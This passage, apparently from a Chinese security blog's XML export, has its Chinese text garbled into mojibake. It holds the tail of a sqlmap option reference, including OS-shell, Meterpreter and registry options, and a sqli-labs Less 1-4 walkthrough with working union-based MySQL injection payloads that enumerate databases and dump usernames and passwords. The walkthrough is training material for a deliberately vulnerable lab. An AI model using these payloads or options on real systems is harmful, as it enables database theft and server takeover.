æ£€æµ‹å¦‚æžœDBMSå½“å‰ç”¨æˆ·æ˜¯DBA --users æžšä¸¾ç”¨æˆ·å’ŒDBMSç”¨æˆ· --passwords å¯†ç æžšä¸¾DBMSç”¨æˆ·å¯†ç å“ˆå¸Œ --privileges ç‰¹æƒåˆ—ä¸¾æ•°æ®åº“ç”¨æˆ·çš„æƒé™ --roles è§’è‰²æžšä¸¾æ•°æ®åº“ç”¨æˆ·çš„è§’è‰² --dbsæžšä¸¾çš„DBMSæ•°æ®åº“ --tables DBMSæ•°æ®åº“è¡¨ --columns DBMSæ•°æ®åº“è¡¨åˆ— --schemaæžšä¸¾æ•°æ®åº“æ¨¡å¼ --countæ£€ç´¢è¡¨æ¡ç›®çš„æ•°é‡ --dumpè½¬å‚¨DBMSæ•°æ®åº“è¡¨æ¡ç›® --dump-allå…¨éƒ¨è½¬å‚¨æ‰€æœ‰çš„DBMSæ•°æ®åº“è¡¨ä¸­çš„æ¡ç›® --searchæœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰ -D DBMSæ•°æ®åº“æžšä¸¾ -T DBMSæ•°æ®åº“è¡¨æžšä¸¾ -C DBMSçš„æ•°æ®åº“è¡¨åˆ—åˆ—ä¸¾ -Uç”¨æˆ·DBMSç”¨æˆ·æžšä¸¾ --exclude-sysdbsæŽ’é™¤åˆ—ä¸¾è¡¨æ—¶ï¼ŒDBMSç³»ç»Ÿæ•°æ®åº“ --start=LIMITSTARTé¦–å…ˆæŸ¥è¯¢çš„è¾“å‡ºé¡¹æ£€ç´¢ --stop=LIMITSTOPæœ€åŽæŸ¥è¯¢çš„è¾“å‡ºé¡¹æ£€ç´¢ --first=FIRSTCHARé¦–å…ˆæŸ¥è¯¢è¾“å‡ºå•è¯å­—ç¬¦æ£€ç´¢ --last=LASTCHARæœ€åŽæŸ¥è¯¢çš„è¾“å‡ºå•è¯å­—ç¬¦æ£€ç´¢ --sql-query=QUERYæ‰§è¡ŒæŸ¥è¯¢çš„SQLè¯­å¥ --sql-shellæç¤ºä¸‹ä¸€ä¸ªäº¤äº’å¼SQLå¤–å£³ è›®åŠ›ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥çš„ã€‚ --common-tables å…±åŒè¡¨æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨ --common-columns å…±åŒåˆ—æ£€æŸ¥å­˜åœ¨å…±åŒçš„åˆ— ç”¨æˆ·å®šä¹‰çš„å‡½æ•°æ³¨å…¥ï¼š è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰åŠŸèƒ½ã€‚ --udf-injectæ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰åŠŸèƒ½ --shared-lib=SHLIBæœ¬åœ°è·¯å¾„çš„å…±äº«åº“ æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®ï¼š è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åŽç«¯æ•°æ®åº“ç®¡ç† ç³»ç»Ÿåº•å±‚çš„æ–‡ä»¶ç³»ç»Ÿã€‚ --file-read=RFILE DBMSæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶ --file-write=WFILEå†™åŽç«¯çš„DBMSæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶ --file-dest=DFILEåŽç«¯æ•°æ®åº“çš„ç»å¯¹æ–‡ä»¶è·¯å¾„å†™å…¥ æ“ä½œç³»ç»Ÿè®¿é—®ï¼š è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åŽç«¯æ•°æ®åº“ç®¡ç† ç³»ç»Ÿåº•å±‚æ“ä½œç³»ç»Ÿã€‚ --os-cmd=OSCMDæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ --os-shellæç¤ºç¬¦ä¸‹äº¤äº’å¼æ“ä½œç³»ç»Ÿå¤–å£³ --os-pwnæç¤ºä¸ºä¸€ä¸ªå½»å¤´å½»å°¾çš„å¸¦å¤–å£³ï¼Œmeterpreteræˆ–VNC --os-smbrelayä¸€ä¸ªç‚¹å‡»æç¤ºä¸€ä¸ªOOBå£³ï¼Œmeterpreteræˆ–VNC --os-bofå­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºå‰¥å‰Š --priv-escæ•°æ®åº“è¿›ç¨‹â€œç”¨æˆ·æƒé™å‡çº§ --msf-path=MSFPATHæœ¬åœ°è·¯å¾„Metasploit Frameworkç­‰3å®‰è£… --tmp-path=TMPPATHè¿œç¨‹ç»å¯¹è·¯å¾„çš„ä¸´æ—¶æ–‡ä»¶ç›®å½• Windowsæ³¨å†Œè¡¨çš„è®¿é—®ï¼š è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åŽç«¯æ•°æ®åº“ç®¡ç† ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚ --reg-readè¯»Windowsæ³¨å†Œè¡¨é¡¹å€¼ --reg-addå†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ® --reg-delLåˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼ --reg-key=REGKEY Windowsæ³¨å†Œè¡¨ --reg-value=REGVAL Windowsæ³¨å†Œè¡¨é”®å€¼ --reg-data=REGDATA Windowsæ³¨å†Œè¡¨å…³é”®å€¼æ•°æ® --reg-type=REGTYPE Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»åž‹ ç§˜ä¹¦é•¿ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬æ€§çš„å·¥ä½œå‚æ•°ã€‚ -s ä¿å­˜å’Œæ¢å¤åœ¨ä¼šè®®æ–‡ä»¶ä¸­æ£€ç´¢æ‰€æœ‰æ•°æ® -t ç™»å½•åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­æ‰€æœ‰çš„HTTPæµé‡ --batch ä¸€æ‰¹ä»Žä¸è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨çš„é»˜è®¤è¡Œä¸º --charset=CHARSETå­—ç¬¦ç¼–ç ï¼Œç”¨äºŽæ•°æ®æ£€ç´¢ --etaæ˜¾ç¤ºé¢„è®¡åˆ°è¾¾æ—¶é—´ä¸ºæ¯ä¸ªè¾“å‡º --flush-session å†²æ´—ä¼šè®®ä¼šè¯æ–‡ä»¶ --fresh-queriesåœ¨ä¼šè®®æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æžœ --save é…ç½®INIæ–‡ä»¶ä¿å­˜é€‰é¡¹ --updateæ›´æ–°çš„SqlMap æ‚é¡¹ï¼š--beep SQLæ³¨å…¥å‘çŽ° --check-payload æ£€æŸ¥æœ‰æ•ˆè½½è·çš„IDSæ£€æµ‹æµ‹è¯• --cleanupæ¸…ç†SqlMapç‰¹å®šçš„UDFå’Œè¡¨çš„DBMS --formsè§£æžå’Œæµ‹è¯•å½¢å¼çš„ç›®æ ‡URL --gpage=GOOGLEPAGEä½¿ç”¨Googleä»ŽæŒ‡å®šçš„é¡µç dorkç»“æžœ --mobileé€šè¿‡HTTP User-Agentå¤´ --page-rankæ˜¾ç¤ºç½‘é¡µæŽ’åï¼ˆPRï¼‰ä¸ºGoogle dorkç»“æžœ --parse-errorsè§£æžDBMSå“åº”é¡µé¢çš„é”™è¯¯ä¿¡æ¯ --replicateå¤åˆ¶å€’å…¥ä¸€ä¸ªSQLite3æ•°æ®åº“ä¸­çš„æ•°æ® --torçš„ä½¿ç”¨é»˜è®¤çš„Torï¼ˆVidaliaçš„/ Privoxyçš„/ Polipoå³å¯ï¼‰ä»£ç†åœ°å€ --wizardå‘å¯¼ä¸ºåˆå­¦è€…ç”¨æˆ·ç®€å•çš„å‘å¯¼ç•Œé¢]]></content>
      <tags>
        <tag>sqli-labs</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs_Less_1-4]]></title>
    <url>%2F2018%2F04%2F19%2Fsqli-labs-Less-1-4%2F</url>
    <content type="text"><![CDATA[sqli-labsç»ƒä¹ SQLæ³¨å…¥ï¼ˆmysqlï¼‰ æ¼æ´žæºä»£ç ä¸‹è½½ï¼šhttps://github.com/Audi-1/sqli-labs æ‰‹å·¥æ³¨å…¥(hackbar)Less-1 Get-Error-Single quotes-Stringä»Žæ ‡é¢˜å¯ä»¥çŸ¥æ˜¯åŸºäºŽgetè¯·æ±‚æ–¹æ³•çš„å•å¼•å·å­—ç¬¦æŠ¥é”™ é¡µé¢æç¤ºè¾“å…¥æ•°å­—åž‹å‚æ•° id /sqli-labs/Less-1/?id=1 è¿”å›žæ­£å¸¸é¡µé¢ Welcome Dhakkan Your Login name:Dumb Your Password:Dumb åŠ ä¸€ä¸ªå•å¼•å·æµ‹è¯• sqli-labs/Less-1/?id=1&apos; é¡µé¢æŠ¥é”™ Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 ä»Žå¤–å±‚ä¾æ¬¡åŽ»æŽ‰é—­åˆçš„å•å¼•å·å¯ä»¥çœ‹åˆ°åªå‰©ä¸‹ 1â€™ ,å¯çŸ¥ä¸ºå­—ç¬¦åž‹æ³¨sqlæ³¨å…¥ï¼ˆå­—ç¬¦åž‹å’Œæ•°å­—åž‹çš„åŒºåˆ«ä¼šåœ¨Less-2åŽåŒºåˆ†ï¼‰ã€‚ æž„é€ payloadåœ¨è¿™é‡Œä½¿ç”¨ # æˆ–â€“ æ³¨é‡ŠæŽ‰å¤šä½™çš„éƒ¨åˆ†ï¼ˆå½“ç„¶ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•é—­åˆè¿™ä¸ªå•å¼•å·ï¼‰ï¼Œå¯¹#è¿›è¡Œäº†urlç¼–ç ï¼Œæž„é€ å¥½ä½¿å…¶æ­£å¸¸è¿”å›žã€‚ sqli-labs/Less-1/?id=1&apos; %23 è¿”å›žæ­£å¸¸ çŒœæµ‹å­—æ®µæ•°ï¼ˆorder by ï¼‰ä½¿ç”¨è”åˆæŸ¥è¯¢ (union select)é¦–å…ˆä½¿ç”¨order by è¿›è¡Œå­—æ®µæ•°çŒœæµ‹ sqli-labs/Less-1/?id=1&apos; order by 10%23 è¿”å›žé”™è¯¯ ï¼šUnknown column â€˜10â€™ in â€˜order clauseâ€™ sqli-labs/Less-1/?id=1&apos; order by 5%23 è¿”å›žæ­£å¸¸ sqli-labs/Less-1/?id=1&apos; order by 6%23 è¿”å›žé”™è¯¯å¯çŸ¥å­—æ®µæ•°ä¸º 5 æ‰¾åˆ°æ˜¾ç¤ºä½sqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4,5%23 è¿™é‡Œæ³¨æ„æŠŠidçš„å€¼è®¾ç½®ä¸ºä¸€ä¸ªé”™è¯¯çš„å€¼ï¼Œè¿™é‡Œè®¾ç½®ä¸ºäº†-1å¯çŸ¥æ˜¾ç¤ºä½åœ¨ 2ï¼Œ3 Welcome Dhakkan Your Login name:2 Your Password:3 æŸ¥çœ‹ç›®æ ‡æ•°æ®åº“åŸºæœ¬ä¿¡æ¯sqli-labs/Less-1/?id=-1&apos; union select 1,version(),user(),4,5%23 è¿”å›žå¦‚ä¸‹ Welcome Dhakkan Your Login name:5.5.53 Your Password:root@localhost å‡½æ•° åŠŸèƒ½ database() è¿”å›žå½“å‰æ•°æ®åº“å security user() è¿”å›žå½“å‰æ•°æ®åº“è¿žæŽ¥ä½¿ç”¨çš„æ•°æ®åº“ security version() è¿”å›žå½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ 5.5.53 system_user() æŸ¥è¯¢ç³»ç»Ÿç”¨æˆ·å root@localhost session_user() è¿žæŽ¥æ•°æ®åº“çš„ç”¨æˆ·å root@localhost current_user() æŸ¥è¯¢å½“å‰ç”¨æˆ·å root@localhost @@version_compile_os æŸ¥è¯¢æ•°æ®åº“æ“ä½œç³»ç»Ÿ Win32 @@datadir æŸ¥è¯¢æ•°æ®åº“è·¯å¾„ C:\phpStudy\MySQL\data\ @@basedir æŸ¥è¯¢MySQLè·¯å¾„ C:/phpStudy/MySQL/ æ³¨ï¼šMySQLåœ¨5.xxç‰ˆæœ¬ä»¥ä¸Šæœ‰ä¸ªinformation_schemaæ•°æ®åº“ï¼Œè¯¥æ•°æ®åº“è®°å½•äº†å½“å‰æ•°æ®åº“çš„æ‰€æœ‰æ•°æ®åº“ã€è¡¨ã€åˆ—ã€ç”¨æˆ·æƒé™ç­‰ä¿¡æ¯ï¼Œå…¶ä¸­SCHEMATA è¡¨å­˜å‚¨MySQLæ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“åã€ç¼–ç ç±»åž‹è·¯å¾„ç­‰ï¼Œshow databases;ç»“æžœå–è‡ªæ­¤è¡¨ï¼›TABLEè¡¨å­˜å‚¨MySQLä¸­çš„è¡¨ä¿¡æ¯ï¼Œshow tables from schemaname;çš„ç»“æžœå–è‡ªæ­¤è¡¨ï¼›COLUMNSè¡¨ï¼šæä¾›äº†è¡¨çš„åˆ—ä¿¡æ¯ï¼Œshow columns from schemaname.tablename;çš„ç»“æžœå–è‡ªæ­¤è¡¨ å¯å¾—åˆ°è¯¥æ•°æ®åº“åŸºæœ¬ä¿¡æ¯ ç‰ˆæœ¬ï¼š5.5.53 ç”¨æˆ·ï¼šroot@localhost å½“å‰æ•°æ®åº“åï¼š security èŽ·å–æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼ˆdatabaseï¼Œtableï¼Œcolumnï¼‰èŽ·å–æ•°æ®åº“sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23 è¿”å›žäº†æ•°æ®åº“ information_schema,ä¸€èˆ¬MySQLä¸­ä¸æ­¢ä¸€ä¸ªæ•°æ®åº“ï¼Œå¯ä»¥åœ¨åŠ ä¸ªlimit 1,1ç¬¬ä¸€ä¸ª1è¡¨ç¤ºä»Žé‚£é‡Œå¼€å§‹ï¼Œç¬¬äºŒä¸ª1è¡¨ç¤ºå‡ ä¸ªï¼Œå¯ä»¥é€šè¿‡ä¸æ–­æ›´æ”¹ç¬¬ä¸€ä¸ªæ•°æ¥æ˜¾ç¤ºæ•°æ®åº“ sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23 å½“ç„¶æ›´ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨group_concat()ä¸€æ¬¡æ€§è¿”å›žæ‰€æœ‰çš„ sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 è¿”å›žï¼šinformation_schema,challenges,mysql,performance_schema,security,testsecurityä¸ºéœ€è¦æŸ¥æ‰¾çš„æ•°æ®åº“ èŽ·å–è¡¨sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 æˆ–è€… sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23 è¿”å›žï¼šemails,referers,uagents,users æ³¨æ„ï¼šsecurityæ˜¯å­—ç¬¦ä¸²è¦ä½¿ç”¨å•å¼•å·åŒ…è£¹ï¼Œæˆ–è€…å°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶ï¼Œæ•°å€¼ç±»åž‹ä¸éœ€è¦å•å¼•å·ï¼ˆæœ‰æ—¶å¯èƒ½ä¼šè¿‡æ»¤æŽ‰å•å¼•å·ï¼‰ èŽ·å–åˆ—sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 è¿”å›žï¼šid,username,password,first_name,last_name èŽ·å–æ•°æ®åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†æ•°æ®åº“åsecurity,è¡¨åusers,åˆ—åid,username,password,first_name,last_name sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 è¿”å›ž Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-Intiger basedåŸºäºŽgetè¯·æ±‚æ–¹æ³•çš„æ•´å½¢æ³¨å…¥æ ¹æ®é¡µé¢æç¤ºå¯çŸ¥ä¸ºæ•°å­—åž‹å‚æ•° id sqli-labs/Less-2/?id=1 é¡µé¢è¿”å›ž Welcome Dhakkan Your Login name:Dumb Your Password:Dumb æ·»åŠ ä¸€ä¸ªå•å¼•å·åŽ sqli-labs/Less-2/?id=1&apos; é¡µé¢è¿”å›žé”™è¯¯ Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 ä»Žå¤–å±‚é€å±‚åŽ»æŽ‰é—­åˆå•å¼•å·å‘çŽ°åªå‰©ä¸‹ä¸€ä¸ªå•å¼•å· ï¼Œå¯ä»¥åˆ¤æ–­ä¸ºæ•°å­—åž‹sqlæ³¨å…¥ã€‚ æž„é€ payloadLess-2/?id=1 %23 æ•°å­—åž‹ç›´æŽ¥æŠŠåŽé¢çš„æ³¨é‡ŠæŽ‰å³å¯ sqli-labs/Less-2/?id=1 order by 6 %23 æŠ¥é”™ sqli-labs/Less-2/?id=1 order by 5 %23 æ­£å¸¸ sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 æ˜¾ç¤ºä½ 2ï¼Œ3 sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 ç‰ˆæœ¬ï¼š5.5.53 æ•°æ®åº“ï¼šsecurity sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 è¿”å›žæ‰€æœ‰çš„æ•°æ®åº“ sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 è¿”å›žsecurityæ•°æ®åº“çš„æ‰€æœ‰è¡¨å sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 è¿”å›žusersè¡¨çš„æ‰€æœ‰åˆ—å sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 è¿”å›žusersè¡¨ä¸­çš„usernameå’Œpasswordå­—æ®µçš„å€¼ ä»¥ä¸Špayloadä¸ŽLess-1ç›¸ä¼¼ å­—ç¬¦åž‹æ³¨å…¥å’Œæ•°å­—åž‹æ³¨å…¥çš„åŒºåˆ«Less-1 å­—ç¬¦åž‹ id=â€™$idâ€™ $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; Less-2 æ•°å­—åž‹ id=$id $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; åŠ äº†ä¸€ä¸ªå•å¼•å·çš„æŠ¥é”™ç»“æžœ å­—ç¬¦åž‹ï¼š&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; ä»Žå¤–é€å±‚åŽ»æŽ‰æˆå¯¹çš„å•å¼•å· 1&apos; æ•°å­—åž‹ï¼š&apos;&apos; LIMIT 0,1&apos; ä»Žå¤–é€å±‚åŽ»æŽ‰æˆå¯¹çš„å•å¼•å· &apos; å¦‚æžœæ²¡æœ‰æŠ¥é”™æ˜¾ç¤ºï¼štest1ä¸æŠ¥é”™,test2æŠ¥é”™ä¸ºå­—ç¬¦åž‹ test1 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 test2 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2 å¯¹æ¯”å¯çŸ¥ï¼šå­—ç¬¦åž‹ä½¿ç”¨å•å·åŒ…è£¹ï¼Œæ•°å­—åž‹æ— ï¼›åŠ äº†ä¸€ä¸ªå•å¼•å·åŽå¯ä»¥çœ‹åˆ°æäº¤çš„å‚æ•°è¢«å•å¼•å·åŒ…è£¹ï¼›ä»¥åŠä¸Šé¢æµ‹è¯•çš„ç»“æžœåˆ¤æ–­ã€‚ Less-3 GET-Error-Single quotes with twist-stringåŸºäºŽgetè¯·æ±‚æ–¹æ³•çš„å¸¦æ‹¬å·çš„å•å¼•å·å­—ç¬¦åž‹æŠ¥é”™æ³¨å…¥æµ‹è¯•sqli-labs/Less-3/?id=1&apos; è¿”å›ž near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 åˆ†æžå‘çŽ°æ˜¯åœ¨ Less-1çš„åŸºç¡€ä¸ŠåŠ äº†æ‹¬å· æž„é€ payloadsqli-labs/Less-3/?id=1&apos;) %23 è¿”å›žæ­£å¸¸,è¿™é‡Œçœ‹ä¸€ä¸‹æºç å°±æ›´å¥½ç†è§£äº† $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; æŒ‰ç…§ä¹‹å‰çš„æ€è·¯æµ‹è¯•å³å¯sqli-labs/Less-3/?id=1&apos;) order by 6 %23 è¿”å›žé”™è¯¯ sqli-labs/Less-3/?id=1&apos;) order by 5 %23 è¿”å›žæ­£å¸¸ sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 å¯çŸ¥ 2ï¼Œ3å›žæ˜¾ Less-4 Get-Error based- Double Quotes-stringåŸºäºŽgetè¯·æ±‚æ–¹æ³•çš„åŒå¼•å·æŠ¥é”™æ³¨å…¥æµ‹è¯•sqli-labs/Less-4/?id=1&apos; é¡µé¢æ­£å¸¸æ²¡æœ‰ä»»ä½•å¼‚å¸¸ï¼ˆè¿™é‡ŒåŠ äº†å•å¼•å·æ²¡ä½œç”¨ï¼‰ï¼ŒåŠ ä¸€ä¸ªåŒå¼•å· sqli-labs/Less-4/?id=1&quot; è¿”å›ž near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 ä»Žå¤–é€å±‚åŽ»æŽ‰æˆå¯¹çš„åŒå¼•å·å’Œå•å¼•å· ï¼Œæˆ‘ä»¬å‘çŽ°æƒ…å†µä¸ŽLess-3ç±»ä¼¼ï¼Œåªæ˜¯å•å¼•å·æ¢æˆåŒå¼•å·ã€‚ æž„é€ payloadsqli-labs/Less-4/?id=1&quot;) %23 è¿”å›žæ­£å¸¸ æŒ‰ç…§ä¹‹å‰çš„æ€è·¯å³å¯sqli-labs/Less-4/?id=1&quot;) order by 6%23 sqli-labs/Less-4/?id=1&quot;) order by 5%23 sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
</search>
